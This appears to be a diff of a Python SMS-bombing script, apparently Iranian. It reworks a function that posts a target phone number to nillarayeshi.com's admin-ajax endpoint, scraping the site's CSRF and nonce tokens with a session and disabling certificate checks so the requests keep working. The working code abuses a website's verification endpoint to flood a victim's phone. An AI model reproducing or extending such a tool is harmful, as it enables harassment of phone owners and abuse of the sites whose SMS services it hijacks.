@@ -92,13 +92,47 @@ def Balad(phone):
         print(f'{r}[!] Balad Exception: {e}{a}')
         return False
 
+
 def nillarayeshi(phone):
     try:
         formatted_phone = "0" + phone.replace("+98", "")
+        session = requests.Session()
         
-        # استفاده از مقادیر ثابت از درخواست واقعی
-        csrf = "2a49f89a8f"
-        nonce = "2a49f89a8f"
+        # دریافت صفحه اصلی با غیرفعال کردن فشرده‌سازی
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "identity",  # غیرفعال کردن فشرده‌سازی
+            "Connection": "keep-alive",
+        }
+        
+        home_response = session.get(
+            "https://nillarayeshi.com/", 
+            timeout=15, 
+            headers=headers,
+            verify=False
+        )
+        home_response.encoding = 'utf-8'
+        
+        # استخراج خودکار توکن‌ها
+        def extract_token(pattern, token_name):
+            match = re.search(pattern, home_response.text)
+            if match:
+                token = match.group(1)
+                print(f'{g}[+] Found {token_name}: {token}{a}')
+                return token
+            else:
+                print(f'{r}[-] Could not find {token_name}{a}')
+                return "2a49f89a8f"  # fallback to default
+        
+        # استخراج توکن‌ها با الگوهای مختلف
+        csrf = extract_token(r'name="csrf" value="([^"]+)"', 'CSRF')
+        nonce = extract_token(r'name="dig_nounce" value="([^"]+)"', 'Nonce')
+        
+        # اگر توکن‌ها پیدا نشدن، از مقادیر پیشفرض استفاده کن
+        if csrf == "2a49f89a8f" and nonce == "2a49f89a8f":
+            print(f'{y}[!] Using default tokens{a}')
         
         url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
         
@@ -137,7 +171,7 @@ def nillarayeshi(phone):
             "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         }
         
-        response = requests.post(url, data=payload, headers=headers, timeout=15)
+        response = session.post(url, data=payload, headers=headers, timeout=15)
         
         print(f'{y}[Debug] Status: {response.status_code}{a}')
         print(f'{y}[Debug] Response: {response.text}{a}')
@@ -156,6 +190,8 @@ def nillarayeshi(phone):
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
+
+
         
 # ==========================
 # لیست سرویس‌ها
